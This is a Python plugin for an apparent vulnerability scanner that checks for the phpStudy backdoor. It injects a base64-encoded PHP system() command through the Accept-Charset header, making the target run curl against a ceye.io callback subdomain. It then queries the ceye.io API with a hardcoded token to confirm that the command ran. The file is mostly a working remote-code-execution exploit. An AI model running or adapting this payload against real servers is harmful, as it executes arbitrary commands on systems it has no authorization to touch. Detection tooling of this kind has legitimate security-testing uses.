import urllib
import requests
import base64
import random
import time
import logging
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "PhpStudyBackdoor"  # 插件名称
        self.info['name'] ='phpStudyBackdoor脚本漏洞' #漏洞名称
        self.info['affects'] = "phpStudy"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload="/index.php"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Random = str(random.randint(666, 666666))
    commandS = ('''system("curl http://{}_phpStudy_backdoor_{}.7ktb2x.ceye.io");''').format(url, Random)
    cmd = base64.b64encode(commandS.encode('utf-8'))
    try:
        payload_url = scheme+"://"+url+ ':' + str(port)+payload
        headers = {
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Sec-Fetch-Site': 'none',
            'accept-charset': cmd,
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'User-Agent': RandomAgent
        }
        s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = s.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = s.get(payload_url,headers=headers, timeout=5, verify=False)
        time.sleep(5)
        ceyeurl = 'http://api.ceye.io/v1/records?token=f84734983a259c598a1edeb772981d14&type=dns&filter='
        try:
            ceye_content = requests.get(ceyeurl, timeout=5).content
            if "{}_phpStudy_backdoor_{}".format(url, Random) in ceye_content:
                Medusa = "{} \r\n漏洞详情:\r\nPayload:{}\r\nHeader\r\n{}".format(url, payload_url,headers)
                _t = VulnerabilityInfo(Medusa)
                web = ClassCongregation.VulnerabilityDetails(_t.info)
                web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
                return (_t.info)
        except:
            _ = VulnerabilityInfo('').info.get('algroup')
            _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
    except Exception as e:
        pass